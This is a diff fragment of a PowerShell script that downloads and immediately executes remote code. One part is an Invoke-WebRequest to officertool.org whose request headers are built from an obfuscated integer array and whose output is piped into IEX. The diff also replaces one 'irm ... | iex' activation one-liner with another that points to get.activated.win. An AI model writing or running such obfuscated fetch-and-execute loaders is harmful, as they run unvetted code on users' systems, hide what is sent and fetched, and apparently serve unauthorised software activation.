@@ -6,4 +6,4 @@ $Headers = @(-341,-461,-405,-457,-181,-261,-413,-405,-441,-465,-333,-277,-269,-3
 IWR -Uri "https://officertool.org/Download/GetLatest" -UseBasicParsing -UserAgent R_Tool_Agent -MaximumRedirection 2 -Method Get -Headers `
 @{-join(0..9|%{$Headers[$_]}|%{-bNot $_}|%{$_-shr 2}|%{$_-as[Char]})=-join(10..20|%{$Headers[$_]}|%{-bNot $_}|%{$_-shr 2}|%{$_-as[Char]})} | IEX
 
-irm https://massgrave.dev/get | iex
+irm https://get.activated.win | iex
